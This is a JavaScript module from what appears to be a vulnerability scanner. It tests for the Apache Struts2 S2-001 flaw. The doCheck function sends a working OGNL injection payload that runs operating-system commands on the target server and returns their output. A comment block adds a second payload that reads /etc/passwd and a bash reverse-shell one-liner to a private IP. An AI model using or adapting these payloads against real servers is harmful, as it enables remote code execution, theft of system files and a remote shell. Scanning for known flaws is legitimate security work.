
module.exports={
	tags:"struts2,001,ww-2030,2030",
	des:"WW-2030,struts2 001漏洞检测",
	VulApps:[
		"https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-001",
		"http://ocnf2x3pk.bkt.clouddn.com/S2-001.war"],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-001",
		"http://issues.apache.org/struts/browse/WW-2030"],
	suport:g_szMyMsg,
	/*
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat","/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
// http://192.168.10.216:8088/S2-001/login.action
// bash -i >& /dev/tcp/192.168.24.90/8080 0>&1
	*/
	doCheck:function (url,fnCbk)
	{
		var _t = this;
		var szOldUrl = url;
		url = fnNotEnd(url);
		this.name = this.name || "username";
		var s = ('%{#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\')),#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'' + g_szCmdW + '\'}:{\'/bin/bash\',\'-c\',\'' + g_szCmd + '\'}),#a=(new java.lang.ProcessBuilder(#cmds)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")'
			+',#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]'
			+ ',#wt=#f.getWriter()'
			+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
			+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
			+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
			+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
			+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
			+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
			+ ',#wt.flush()'
			+',#wt.close()}');

		request(({method: 'POST',uri: url 
			,body:this.name + "=" + encodeURIComponent(s) + "&password="
			,headers:
		    {
		    	"user-agent": g_szUa,
		    	"content-type":"application/x-www-form-urlencoded"
		    }}),
	    	function(e,r,b)
		    {
		    	// console.log(b);
		    	fnDoBody(b,"s2-001,s2-012",szOldUrl,null,function(o)
		    	{
		    		var r = {"url":szOldUrl,"send":url};
	  				fnCbk(global.copyO2O(r,o),_t);
		    	});
		    });
	}
};